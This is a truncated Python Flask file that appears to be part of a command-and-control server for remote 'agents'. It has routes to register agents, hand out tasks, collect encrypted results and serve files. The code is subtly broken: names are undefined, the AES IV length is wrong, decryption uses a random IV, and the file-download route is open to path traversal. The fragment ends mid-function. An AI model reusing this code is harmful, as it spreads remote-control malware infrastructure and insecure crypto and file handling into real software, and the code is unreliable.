from flask import Flask, request, jsonify
import os
import sys
import base64
from Crypto.Cipher import AES
from Crypto import Random

class AESCipher(object):
    def __init__(self, key):
        self.block_size = 32
        self.key = key

    def pad(self, s):
        return s + (self.block_size - len(s) % self.block_size) * chr(self.block_size - len(s) % self.block_size)

    def unpad(self, s):
        return s[:-ord(s[len(s)-1:])]

    def encrypt(self, raw):
        raw = self.pad(raw)
        cipher = AES.new(self.key, AES.MODE_CBC, Random.new().read(self.block_size))
        enc = cipher.encrypt(raw)
        return base64.b64encode(enc)

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        cipher = AES.new(self.key, AES.MODE_CBC, Random.new().read(self.block_size))
        dec = cipher.decrypt(enc)
        return self.unpad(dec)

def ENCRYPT(PLAIN, KEY):
    c = AESCipher(KEY)
    enc = c.encrypt(PLAIN)
    return enc.decode()

def DECRYPT(ENC, KEY):
    c = AESCipher(KEY)
    dec = c.decrypt(ENC)
    return dec

def generateKey():
    key = base64.b64encode(os.urandom(32))
    return key.decode()


app = Flask(__name__)

@app.route("/reg", methods=['POST'])
def register():
    name = request.form.get("name")
    key = generateKey()
    return jsonify({"key": key})

@app.route("/tasks/<name>", methods=['POST'])
def receiveTasks(name):
    task = request.form.get("task")
    return jsonify({"result": "Task received: " + task})

@app.route("/results/<name>", methods=['POST'])
def receiveResults(name):
    result = flask.request.form.get("result")
    displayResults(name, result)
    return ('',204)

@app.route("/download/<name>", methods=['GET'])
def sendFile(name):
    f = open("{}{}".format(filePath, name), "rt")
    data = f.read()
    f.close()
    return (data, 200)


def displayResults(name, result):
    if isValidAgent(name, 0) == True:
        if result == "":
            success("Agent {} completed task.".format(name))
        else:
            key = agents[name].key
            if agents[name].Type == "p":
                try:
                    plaintext = DECRYPT(result, key)
                except:
                    pass
